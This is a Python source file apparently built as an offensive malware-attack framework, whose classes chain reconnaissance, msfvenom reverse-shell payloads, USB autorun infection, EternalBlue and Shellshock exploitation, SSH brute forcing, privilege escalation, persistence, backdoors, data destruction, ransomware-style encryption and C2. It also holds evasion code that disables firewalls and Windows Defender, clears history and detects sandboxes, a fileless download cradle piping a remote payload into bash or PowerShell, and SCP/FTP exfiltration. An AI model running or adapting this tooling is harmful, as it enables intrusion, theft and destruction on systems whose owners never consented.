import os 
import platform
import subprocess
import re
import time
import logging
import shutil
import random 
from pathlib import Path
import base64
from datetime import datetime

class malware_attack:
    class recon:
        def __init__(self, target_ip=None):
            self.target_ip = target_ip
            self.os = None

        def run_command(self, command):
            """Helper function to run a system command and return the output."""
            try:
                result = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                return result.decode('utf-8')
            except subprocess.CalledProcessError as e:
                print(f"Error running command '{command}': {e.output.decode('utf-8')}")
                return None

        def extract_ips_from_netdiscover(self, netdiscover_output):
            """Extract IPs from Netdiscover output."""
            ips = []
            for line in netdiscover_output.splitlines():
                # Look for lines that contain IPs (skip any lines that don't match the pattern)
                match = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
                if match:
                    ips.append(match.group(1))
            return ips

        def run_nmap_on_ips(self, ip_list):
            """Run Nmap on each IP in the list."""
            for ip in ip_list:
                print(f"Running Nmap on {ip}...")
                # First try: Nmap service version scan
                command = f"nmap -sV {ip}"
                result = self.run_command(command)
                
                if result:
                    print(f"Nmap service version scan successful for {ip}.")
                    print(result)
                else:
                    print(f"Nmap service version scan failed for {ip}. Trying with -Pn...")
                    command = f"nmap -Pn {ip}"  # Skip host discovery
                    result = self.run_command(command)
                    
                    if result:
                        print(f"Nmap -Pn scan successful for {ip}.")
                        print(result)
                    else:
                        print(f"Nmap -Pn scan failed for {ip}. Trying with -sP...")
                        command = f"nmap -sP {ip}"  # Ping scan
                        result = self.run_command(command)
                        
                        if result:
                            print(f"Nmap -sP scan successful for {ip}.")
                            print(result)
                        else:
                            print(f"Nmap -sP scan failed for {ip}. Skipping {ip}.")
            
        def recon_active(self):
            """Perform Active Recon using Nmap with retry logic."""
            print(f"Running Active Recon on {self.target_ip}...")
            
            if not self.target_ip:
                # No target IP provided, run Netdiscover to find active hosts in the network
                command = f"netdiscover -i eth0 -r 192.168.1.0/24"  # Adjust network range as needed
                result = self.run_command(command)
                
                if result:
                    print("Netdiscover scan successful.")
                    ips = self.extract_ips_from_netdiscover(result)
                    # Run Nmap on the discovered IPs
                    self.run_nmap_on_ips(ips)
                    return ips  # Return list of discovered IPs
                else:
                    print("Netdiscover scan failed. No live hosts found.")
                    return None

            else:
                # If a specific target IP is provided, use it for Nmap
                command = f"nmap -sV {self.target_ip}"
                result = self.run_command(command)
                
                if result:
                    print("Nmap service version scan successful.")
                    print(result)
                    return result
                else:
                    print("Nmap service version scan failed. Trying with a Ping scan...")
                    command = f"nmap -sP {self.target_ip}"
                    result = self.run_command(command)
                    if result:
                        print("Nmap ping scan successful.")
                        print(result)
                        return result
                    else:
                        print("Nmap ping scan failed. Trying Netdiscover...")
                        # Use Netdiscover for live host discovery
                        command = f"netdiscover -i eth0 -r 192.168.1.0/24"  # Adjust network range
                        result = self.run_command(command)
                        if result:
                            print("Netdiscover scan successful.")
                            ips = self.extract_ips_from_netdiscover(result)
                            # Run Nmap on the discovered IPs
                            self.run_nmap_on_ips(ips)
                            return ips
                        else:
                            print("Netdiscover scan failed. No live hosts found.")
                            return None

        def detect_os(self, nmap_result):
            """Advanced OS Detection from Nmap results."""
            print(f"Detecting OS for {self.target_ip} from Nmap output...")
            
            if "linux" in nmap_result.lower():
                self.os = "Linux"
            elif "windows" in nmap_result.lower():
                self.os = "Windows"
            else:
                # Check for specific OS patterns in Nmap output
                if "os-fingerprint" in nmap_result.lower():
                    if "Linux" in nmap_result:
                        self.os = "Linux"
                    elif "Windows" in nmap_result:
                        self.os = "Windows"
                    else:
                        self.os = "Unknown"
                else:
                    self.os = "Unknown"

        def perform_recon(self):
            """Run both active and passive recon and handle retries."""
            active_recon_result = self.recon_active()
            
            if active_recon_result:
                print("Active Recon was successful.")
                self.detect_os(active_recon_result)
            else:
                print("Active Recon failed, running Passive Recon...")
                passive_recon_result = self.recon_passive()
                
                if passive_recon_result:
                    print("Passive Recon was successful.")
                    self.detect_os(passive_recon_result)
                else:
                    print("Both Active and Passive Recon failed. Cannot proceed.")

            # Return results of recon
            if self.os:
                return self.os
            else:
                return None
            
        def recon_passive(self):
            """Perform Passive Recon using Netdiscover."""
            print(f"Running Passive Recon on {self.target_ip}...")
            command = f"netdiscover -i eth0 -r 192.168.1.0/24"  # Adjust interface and IP range
            result = self.run_command(command)
            if result:
                print("Netdiscover passive scan successful.")
                print(result)
                return result
            else:
                print("Netdiscover passive scan failed.")
                return None
            
            pass

        
    # weaponization
        """
        what do we use during a malware attack
        -viruses:
            - worm
            - trojan 
            - keylogger
        """
        
    class Weaponization:
        def __init__(self, os_type=None, target_ip=None):
            self.os_type = os_type
            self.target_ip = target_ip
            self.attack_map = {
                "keylogger": "scripts/keylogger.py",
                "malware_payload": "scripts/malware_payload.py",
                "ransomware": "scripts/ransomware/ransomware.py",
                "reverse_shell": "scripts/reverse_shell.py",
                "virus": "scripts/virus.py",
                "worm": "scripts/worm.py"
            }

            # Set up logging for error handling
            logging.basicConfig(filename="attack_log.txt", level=logging.INFO, 
                                format="%(asctime)s - %(message)s")
            self.max_retries = 3  # Max retries if something fails

        def run_command(self, command):
            """Helper function to run a system command and return the output."""
            try:
                result = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                return result.decode('utf-8')
            except subprocess.CalledProcessError as e:
                logging.error(f"Error running command '{command}': {e.output.decode('utf-8')}")
                return None

        def execute_script(self, script_name):
            """Execute the malware script with fail-safe and retries."""
            attempts = 0
            while attempts < self.max_retries:
                try:
                    subprocess.run(["python", script_name], check=True)
                    logging.info(f"Successfully executed {script_name}")
                    return True
                except subprocess.CalledProcessError as e:
                    attempts += 1
                    logging.error(f"Error executing {script_name}: {e}")
                    time.sleep(5)  # Wait before retrying
                except FileNotFoundError:
                    logging.error(f"Script {script_name} not found.")
                    return False
            return False

        def deploy_malware(self, attack_type):
            """Deploy the selected malware with fail-safe and logging."""
            if attack_type in self.attack_map:
                script_name = self.attack_map[attack_type]
                logging.info(f"Deploying {attack_type} with script {script_name}")
                success = self.execute_script(script_name)
                if not success:
                    logging.error(f"Failed to deploy {attack_type}")
            else:
                logging.error(f"Attack type '{attack_type}' not recognized.")

        pass
    
    class Delivery:
        def __init__(self, target_ip=None, usb_path=None):
            self.target_ip = target_ip
            self.usb_path = usb_path

        def run_command(self, command):
            """Helper function to run a system command and return the output."""
            try:
                result = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                return result.decode('utf-8')
            except subprocess.CalledProcessError as e:
                print(f"Error running command '{command}': {e.output.decode('utf-8')}")
                return None

        def make_executable(self, script_path):
            """Convert a Python script to an executable using PyInstaller."""
            print(f"Compiling {script_path} into an executable...")
            command = f"pyinstaller --onefile --distpath dist --workpath build --specpath . {script_path}"
            result = self.run_command(command)
            if result:
                print(f"Successfully compiled {script_path}")
                return True
            else:
                print(f"Failed to compile {script_path}")
                return False

        def copy_to_usb(self, malware_executable):
            """Copy the malware executable to the USB device."""
            if not os.path.exists(self.usb_path):
                print(f"USB path {self.usb_path} does not exist.")
                return False
            try:
                shutil.copy(malware_executable, self.usb_path)
                print(f"Successfully copied {malware_executable} to USB at {self.usb_path}")
                return True
            except Exception as e:
                print(f"Failed to copy file to USB: {e}")
                return False

        def create_autorun_infection(self, malware_executable):
            """Create an autorun.inf file to make malware run automatically when the USB is plugged in (older systems)."""
            autorun_content = f"""
            [Autorun]
            open={malware_executable}
            action=Start Malware
            """
            autorun_path = os.path.join(self.usb_path, "autorun.inf")
            try:
                with open(autorun_path, "w") as autorun_file:
                    autorun_file.write(autorun_content)
                print(f"Successfully created autorun.inf in {self.usb_path}")
                return True
            except Exception as e:
                print(f"Failed to create autorun.inf: {e}")
                return False

        def generate_payload(self):
            """Generate reverse shell payload using msfvenom (using bash script for efficiency)."""
            if self.target_ip is None:
                print("Target IP not provided. Cannot generate payload.")
                return None

            print(f"Generating reverse shell payload using msfvenom for IP: {self.target_ip}")
            bash_script = """
            #!/bin/bash
            msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT=4444 -f exe -o reverse_shell.exe
            """.format(LHOST=self.target_ip)
            
            payload_script_path = "./generate_payload.sh"
            
            with open(payload_script_path, "w") as file:
                file.write(bash_script)
            
            # Make the script executable
            os.chmod(payload_script_path, 0o755)
            
            # Run the bash script to generate the payload
            result = subprocess.run(payload_script_path, shell=True, capture_output=True)
            
            # Check if the payload was generated successfully
            if result.returncode == 0:
                print("Payload successfully generated: reverse_shell.exe")
                return "reverse_shell.exe"
            else:
                print(f"Failed to generate payload: {result.stderr.decode('utf-8')}")
                return None

        def exploit_network(self):
            """Network delivery methods: Attempt to exploit known vulnerabilities or use social engineering."""
            print("Attempting network exploitation (Metasploit, reverse shell, etc.)...")

            # Example Metasploit Command to exploit a vulnerable system:
            if self.target_ip is None:
                print("No target IP provided for exploitation.")
                return

            # Assuming Metasploit Framework is installed
            print("Running Metasploit to exploit target...")
            msf_command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={self.target_ip} LPORT=4444 -f exe -o /tmp/reverse_shell.exe"
            result = subprocess.run(msf_command, shell=True, capture_output=True)
            
            if result.returncode == 0:
                print("Payload generated via Metasploit successfully.")
                msf_listener_command = f"msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST {self.target_ip}; set LPORT 4444; exploit'"
                subprocess.run(msf_listener_command, shell=True)
            else:
                print(f"Failed to generate payload via Metasploit: {result.stderr.decode('utf-8')}")

        def usb_dropping(self):
            """Drop the malware on the USB device, including autorun and executable files."""
            print(f"Starting USB dropping process on {self.usb_path}...")
            
            # Generate payload first
            payload = self.generate_payload()
            if payload is None:
                print("Payload generation failed. Cannot proceed.")
                return

            # Copy the payload to USB
            if self.copy_to_usb(payload):
                print("Malware dropped on USB successfully.")
                # Create autorun.inf (works only on older systems)
                self.create_autorun_infection(payload)
            else:
                print("Failed to copy malware to USB.")

            # Create a standalone executable using PyInstaller (so it can run on systems without Python)
            if self.make_executable(payload):
                print(f"Executable version of {payload} created successfully.")
            else:
                print(f"Failed to create an executable for {payload}.")

        def execute(self):
            """Execute all delivery methods."""
            if self.usb_path:
                self.usb_dropping()
            else:
                # Try network exploitation methods
                self.exploit_network()
                


    class Exploitation:
        def __init__(self):
            self.target_ip = None
            self.web_target_ip = None

        def set_target(self, target_ip, web_target_ip):
            self.target_ip = target_ip
            self.web_target_ip = web_target_ip

        def check_vulnerability(self):
            """
            Check if the target system is vulnerable using Nmap (EternalBlue detection)
            """
            print(f"Checking SMB vulnerability on {self.target_ip}...")
            subprocess.run(["nmap", "-p", "445", "--script", "smb-vuln-ms17-010", self.target_ip], check=True)

        def exploit_eternalblue(self):
            """
            Exploit EternalBlue vulnerability using Metasploit
            """
            print(f"Attempting to exploit EternalBlue on {self.target_ip}...")
            if platform.system() == 'Windows':
                subprocess.run(["msfconsole", "-x", f"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {self.target_ip}; run;"], check=True)
            else:
                # Call the exploit.sh script for Linux systems
                subprocess.run(["bash", "./exploit.sh", self.target_ip, self.web_target_ip], check=True)

        def deliver_reverse_shell(self):
            """
            Deliver reverse shell using Netcat
            """
            print(f"Delivering reverse shell to {self.target_ip}...")
            if platform.system() == 'Windows':
                subprocess.run(["exploit.bat", self.target_ip], check=True)  # For Windows, use the batch file
            else:
                subprocess.run(["bash", "./exploit.sh", self.target_ip, self.web_target_ip], check=True)

        def brute_force_attack(self):
            """
            Attempt brute force attack on SSH if necessary using Hydra
            """
            print(f"Attempting brute force SSH attack on {self.target_ip}...")
            subprocess.run(["hydra", "-l", "root", "-P", "/path/to/wordlist.txt", f"ssh://{self.target_ip}"], check=True)

        def exploit_shellshock(self):
            """
            Exploit Shellshock vulnerability via web servers
            """
            print(f"Exploiting Shellshock vulnerability on {self.web_target_ip}...")
            subprocess.run(["bash", "./exploit.sh", self.target_ip, self.web_target_ip], check=True)

        def run_all_exploits(self):
            """
            Run all exploits in sequence
            """
            self.check_vulnerability()
            self.exploit_eternalblue()
            self.deliver_reverse_shell()
            self.brute_force_attack()
            self.exploit_shellshock()
        
        
    class PostExploitation:
        def __init__(self):
            self.target_ip = None
            self.web_target_ip = None
            self.scripts_dir = os.path.join(os.getcwd(), 'postExploits')  # Define path to postExploits folder

        def set_target(self, target_ip, web_target_ip):
            self.target_ip = target_ip
            self.web_target_ip = web_target_ip

        def escalate_privileges(self):
            """
            Attempt privilege escalation to gain higher-level access.
            """
            print(f"Attempting privilege escalation on {self.target_ip}...")
            escalate_script = os.path.join(self.scripts_dir, 'escalate_privileges.sh')
            if platform.system() == 'Windows':
                subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", os.path.join(self.scripts_dir, 'escalate_privileges.ps1')], check=True)
            else:
                if os.path.exists(escalate_script):
                    subprocess.run(["bash", escalate_script, self.target_ip], check=True)
                else:
                    print("[!] escalate_privileges.sh script not found.")

        def establish_persistence(self):
            """
            Set up persistence mechanisms to ensure continued access.
            """
            print(f"Setting up persistence on {self.target_ip}...")
            persistence_script = os.path.join(self.scripts_dir, 'persistence.sh')
            if platform.system() == 'Windows':
                subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", os.path.join(self.scripts_dir, 'persistence.ps1')], check=True)
            else:
                if os.path.exists(persistence_script):
                    subprocess.run(["bash", persistence_script, self.target_ip], check=True)
                else:
                    print("[!] persistence.sh script not found.")

        def exfiltrate_data(self):
            """
            Exfiltrate data from the target system.
            """
            print(f"Exfiltrating data from {self.target_ip}...")
            exfiltration_script = os.path.join(self.scripts_dir, 'data_exfiltration.py')
            if os.path.exists(exfiltration_script):
                subprocess.run(["python3", exfiltration_script, self.target_ip], check=True)
            else:
                print("[!] data_exfiltration.py script not found.")

        def cleanup(self):
            """
            Clean up traces of the attack to avoid detection.
            """
            print("Cleaning up traces of the attack...")
            cleanup_script = os.path.join(self.scripts_dir, 'cleanup.sh')
            if os.path.exists(cleanup_script):
                subprocess.run(["bash", cleanup_script, self.target_ip], check=True)
            else:
                print("[!] cleanup.sh script not found.")

        def run_post_exploitation(self):
            """
            Run all post-exploitation activities in sequence.
            """
            self.escalate_privileges()
            self.establish_persistence()
            self.exfiltrate_data()
            self.cleanup()

    
    class PrivilegeEscalationClass:
        def __init__(self):
            self.scripts_dir = os.path.join(os.getcwd(), 'privileged_escalations')

        def check_sudo(self):
            print("[*] Checking sudo permissions...")
            sudo_script = os.path.join(self.scripts_dir, 'sudo_escalation.sh')
            if os.path.exists(sudo_script):
                subprocess.run(['bash', sudo_script])
            else:
                print("[!] sudo_escalation.sh script not found.")
            
        def check_suid(self):
            print("[*] Checking for SUID binaries...")
            suid_script = os.path.join(self.scripts_dir, 'suid_escalation.sh')
            if os.path.exists(suid_script):
                subprocess.run(['bash', suid_script])
            else:
                print("[!] suid_escalation.sh script not found.")
        
        def check_permissions(self):
            print("[*] Checking for weak file permissions...")
            permissions_script = os.path.join(self.scripts_dir, 'weak_permissions_escalation.sh')
            if os.path.exists(permissions_script):
                subprocess.run(['bash', permissions_script])
            else:
                print("[!] weak_permissions_escalation.sh script not found.")
        
        def check_kernel_exploits(self):
            print("[*] Checking for possible kernel exploits...")
            kernel_script = os.path.join(self.scripts_dir, 'kernel_exploit_check.sh')
            if os.path.exists(kernel_script):
                subprocess.run(['bash', kernel_script])
            else:
                print("[!] kernel_exploit_check.sh script not found.")
        
        def dump_password_hashes(self):
            print("[*] Attempting to dump password hashes...")
            hashes_script = os.path.join(self.scripts_dir, 'dump_password_hashes.sh')
            if os.path.exists(hashes_script):
                subprocess.run(['bash', hashes_script])
            else:
                print("[!] dump_password_hashes.sh script not found.")
        
        def run_all(self):
            # Call each method to check and escalate
            self.check_sudo()
            self.check_suid()
            self.check_permissions()
            self.check_kernel_exploits()
            self.dump_password_hashes()

    class LateralMovement:
        def __init__(self):
            self.target_ip = None
            self.scripts_dir = os.path.join(os.getcwd(), 'lateralMovement')  # Path to lateralMovement folder

        def set_target(self, target_ip):
            self.target_ip = target_ip

        def perform_smb_attack(self):
            """
            Perform lateral movement using SMB (Server Message Block) for Windows targets.
            """
            print(f"Attempting SMB lateral movement on {self.target_ip}...")
            smb_script = os.path.join(self.scripts_dir, 'smb_lateral_movement.sh')
            if platform.system() == 'Windows':
                subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", os.path.join(self.scripts_dir, 'smb_lateral_movement.ps1')], check=True)
            else:
                if os.path.exists(smb_script):
                    subprocess.run(["bash", smb_script, self.target_ip], check=True)
                else:
                    print("[!] smb_lateral_movement.sh script not found.")

        def perform_ssh_attack(self):
            """
            Perform lateral movement using SSH for Linux/Unix-based targets.
            """
            print(f"Attempting SSH lateral movement on {self.target_ip}...")
            ssh_script = os.path.join(self.scripts_dir, 'ssh_lateral_movement.sh')
            if os.path.exists(ssh_script):
                subprocess.run(["bash", ssh_script, self.target_ip], check=True)
            else:
                print("[!] ssh_lateral_movement.sh script not found.")

        def perform_rdp_attack(self):
            """
            Perform lateral movement using RDP (Remote Desktop Protocol) for Windows targets.
            """
            print(f"Attempting RDP lateral movement on {self.target_ip}...")
            rdp_script = os.path.join(self.scripts_dir, 'rdp_lateral_movement.sh')
            if platform.system() == 'Windows':
                subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", os.path.join(self.scripts_dir, 'rdp_lateral_movement.ps1')], check=True)
            else:
                if os.path.exists(rdp_script):
                    subprocess.run(["bash", rdp_script, self.target_ip], check=True)
                else:
                    print("[!] rdp_lateral_movement.sh script not found.")

        def run_lateral_movement(self):
            """
            Run all lateral movement activities in sequence.
            """
            self.perform_smb_attack()
            self.perform_ssh_attack()
            self.perform_rdp_attack()

    class Persistence:
        def __init__(self):
            self.target_ip = None
            self.scripts_dir = os.path.join(os.getcwd(), 'persistence')  # Path to persistence folder

        def set_target(self, target_ip):
            self.target_ip = target_ip

        def add_startup_entry(self):
            """
            Add a program to startup to maintain persistence on the target system.
            """
            print(f"Adding startup entry on {self.target_ip}...")
            if platform.system() == 'Windows':
                subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", os.path.join(self.scripts_dir, 'add_startup.ps1')], check=True)
            else:
                subprocess.run(["bash", os.path.join(self.scripts_dir, 'add_startup.sh'), self.target_ip], check=True)

        def create_scheduled_task(self):
            """
            Create a scheduled task to maintain persistence on Windows.
            """
            print(f"Creating scheduled task on {self.target_ip}...")
            if platform.system() == 'Windows':
                subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", os.path.join(self.scripts_dir, 'scheduled_task.ps1')], check=True)
            else:
                print("[!] Scheduled task creation is not supported on Linux in this implementation.")

        def install_backdoor(self):
            """
            Install a backdoor to maintain remote access on the target.
            """
            print(f"Installing backdoor on {self.target_ip}...")
            if platform.system() == 'Windows':
                subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", os.path.join(self.scripts_dir, 'backdoor_install.ps1')], check=True)
            else:
                subprocess.run(["bash", os.path.join(self.scripts_dir, 'backdoor_install.sh'), self.target_ip], check=True)

        def run_persistence(self):
            """
            Run all persistence activities in sequence.
            """
            self.add_startup_entry()
            self.create_scheduled_task()
            self.install_backdoor()
            
    class Impact:
        def __init__(self):
            self.target_ip = None
            self.scripts_dir = os.path.join(os.getcwd(), 'impact')  # Path to impact folder

        def set_target(self, target_ip):
            self.target_ip = target_ip

        def destroy_data(self):
            """
            Destroy or corrupt important files on the target system.
            """
            print(f"Destroying data on {self.target_ip}...")
            if platform.system() == 'Windows':
                subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", os.path.join(self.scripts_dir, 'destroy_data.ps1')], check=True)
            else:
                subprocess.run(["bash", os.path.join(self.scripts_dir, 'destroy_data.sh'), self.target_ip], check=True)

        def dos_attack(self):
            """
            Initiate a Denial of Service (DoS) attack on the target system.
            """
            print(f"Initiating DoS attack on {self.target_ip}...")
            if platform.system() == 'Windows':
                subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", os.path.join(self.scripts_dir, 'dos_attack.ps1')], check=True)
            else:
                subprocess.run(["bash", os.path.join(self.scripts_dir, 'dos_attack.sh'), self.target_ip], check=True)

        def encrypt_data(self):
            """
            Encrypt sensitive files on the target system (simulate ransomware attack).
            """
            print(f"Encrypting data on {self.target_ip}...")
            if platform.system() == 'Windows':
                subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", os.path.join(self.scripts_dir, 'encrypt_data.ps1')], check=True)
            else:
                subprocess.run(["bash", os.path.join(self.scripts_dir, 'encrypt_data.sh'), self.target_ip], check=True)

        def shutdown_system(self):
            """
            Initiate a system shutdown or restart to disrupt the target system.
            """
            print(f"Shutting down system on {self.target_ip}...")
            if platform.system() == 'Windows':
                subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", os.path.join(self.scripts_dir, 'shutdown_system.ps1')], check=True)
            else:
                subprocess.run(["bash", os.path.join(self.scripts_dir, 'shutdown_system.sh'), self.target_ip], check=True)

        def run_impact(self):
            """
            Run all impact activities in sequence.
            """
            self.destroy_data()
            self.dos_attack()
            self.encrypt_data()
            self.shutdown_system()

    class C2:
        def __init__(self):
            self.target_ip = None
            self.listener_ip = None
            self.listener_port = None
            self.scripts_dir = os.path.join(os.getcwd(), 'C2')  # Path to C2 folder

        def set_target(self, target_ip, listener_ip, listener_port):
            self.target_ip = target_ip
            self.listener_ip = listener_ip
            self.listener_port = listener_port

        def start_reverse_shell(self):
            """
            Start a reverse shell connection back to the attacker's listener.
            """
            print(f"Starting reverse shell on {self.target_ip}...")
            if platform.system() == 'Windows':
                subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", os.path.join(self.scripts_dir, 'reverse_shell.ps1'), self.listener_ip, self.listener_port], check=True)
            else:
                subprocess.run(["bash", os.path.join(self.scripts_dir, 'reverse_shell.sh'), self.listener_ip, self.listener_port], check=True)

        def create_persistent_backdoor(self):
            """
            Create a persistent backdoor to maintain access even after a reboot.
            """
            print(f"Creating persistent backdoor on {self.target_ip}...")
            if platform.system() == 'Windows':
                subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", os.path.join(self.scripts_dir, 'persistent_backdoor.ps1'), self.target_ip], check=True)
            else:
                subprocess.run(["bash", os.path.join(self.scripts_dir, 'persistent_backdoor.sh'), self.target_ip], check=True)

        def start_c2_server(self):
            """
            Start an HTTP/HTTPS C2 server to communicate with the target.
            """
            print(f"Starting C2 server on {self.listener_ip}:{self.listener_port}...")
            subprocess.run(["python3", os.path.join(self.scripts_dir, 'C2/c2_server.py'), self.listener_ip, str(self.listener_port)], check=True)

        def monitor_c2_connection(self):
            """
            Monitor the C2 connection to ensure stability.
            """
            print(f"Monitoring C2 connection to {self.target_ip}...")
            while True:
                time.sleep(5)
                # In a real scenario, you would check for an active connection here
                print("[*] Connection is active...")

        def run_c2_operations(self):
            """
            Run all C2 operations in sequence.
            """
            self.start_reverse_shell()
            self.create_persistent_backdoor()
            self.start_c2_server()
            self.monitor_c2_connection()
        
        


    class EvasionObfuscation:
        def __init__(self, os_type=None):
            self.os_type = os_type

        def run_command(self, command):
            """Run a system command and return output."""
            try:
                result = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                return result.decode('utf-8')
            except subprocess.CalledProcessError as e:
                print(f"Error: {e.output.decode('utf-8')}")
                return None

        def evade_detection(self):
            """Implement defense evasion techniques."""
            if self.os_type == "Linux":
                print("Attempting defense evasion on Linux...")
                # Clear bash history
                self.run_command("history -c")
                # Disable firewall (fail-safe for stealth)
                self.run_command("ufw disable")
                print("Cleared history and disabled firewall.")
            elif self.os_type == "Windows":
                print("Attempting defense evasion on Windows...")
                # Stop Windows Defender
                self.run_command("sc stop WinDefend")
                # Disable Windows firewall
                self.run_command("netsh advfirewall set allprofiles state off")
                print("Windows Defender stopped and firewall disabled.")
            else:
                print("Unknown OS for evasion techniques.")

        def obfuscate_script(self, script_path, output_path):
            """Obfuscates a given script."""
            print(f"Obfuscating {script_path}...")
            with open(script_path, 'rb') as script_file:
                original_script = script_file.read()
                encoded_script = base64.b64encode(original_script).decode('utf-8')  # Base64 encoding to obfuscate
                with open(output_path, 'w') as obfuscated_file:
                    obfuscated_file.write(f"import base64\nexec(base64.b64decode('{encoded_script}').decode('utf-8'))")
            print(f"Obfuscated script saved to {output_path}")

        def anti_sandbox_detection(self):
            """Detect sandbox environment and evade execution."""
            print("Checking for sandbox environment...")
            suspicious_indicators = ['VMware', 'VirtualBox', 'Sandbox']
            for indicator in suspicious_indicators:
                if indicator in os.uname()[0]:
                    print("Sandbox detected. Aborting execution.")
                    return True
            return False

        def anti_debugging(self):
            """Implement anti-debugging techniques."""
            print("Checking for debuggers...")
            try:
                if 'gdb' in os.popen('ps aux').read() or 'strace' in os.popen('ps aux').read():
                    print("Debugger detected. Aborting execution.")
                    return True
            except Exception as e:
                print(f"Error during anti-debugging check: {e}")
            return False

        def fileless_attack(self):
            """Perform fileless attack."""
            print("Executing fileless attack...")
            if platform.system() == 'Windows':
                powershell_script = '''
                $command = "iex (New-Object Net.WebClient).DownloadString('http://example.com/payload')"
                Invoke-Expression $command
                '''
                self.run_command(powershell_script)
            else:
                bash_command = '''
                curl http://example.com/payload | bash
                '''
                self.run_command(bash_command)

        def cleanup_traces(self):
            """Clean up traces of the attack."""
            print("Cleaning up traces...")
            self.run_command("./cleanup.sh")

        def run_evasion(self):
            """Run all evasion techniques."""
            if self.anti_sandbox_detection():
                return
            if self.anti_debugging():
                return
            self.obfuscate_script('./scripts/some_script.py', './scripts/obfuscated_script.py')
            self.fileless_attack()
            self.cleanup_traces()


    

    class Exfiltration:
        def __init__(self, target_ip=None, exfiltration_target=None):
            self.target_ip = target_ip
            self.exfiltration_target = exfiltration_target

        def run_command(self, command):
            """Run a system command and return output."""
            try:
                result = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                return result.decode('utf-8')
            except subprocess.CalledProcessError as e:
                print(f"Error: {e.output.decode('utf-8')}")
                return None

        def exfiltrate_data(self):
            """Exfiltrate data using various tools and methods."""
            if not self.target_ip or not self.exfiltration_target:
                print("Target IP or exfiltration target missing.")
                return

            print(f"Exfiltrating data from {self.target_ip} to {self.exfiltration_target}...")

            # Use SCP for file transfer
            scp_command = f"scp /path/to/data user@{self.exfiltration_target}:/path/to/destination"
            result = self.run_command(scp_command)
            if result:
                print(f"Data exfiltrated successfully using SCP: {result}")
            else:
                print("SCP failed, trying FTP...")
                ftp_command = f"ftp {self.exfiltration_target}"
                result = self.run_command(ftp_command)
                if result:
                    print(f"Data exfiltrated successfully using FTP: {result}")
                else:
                    print("Exfiltration failed.")


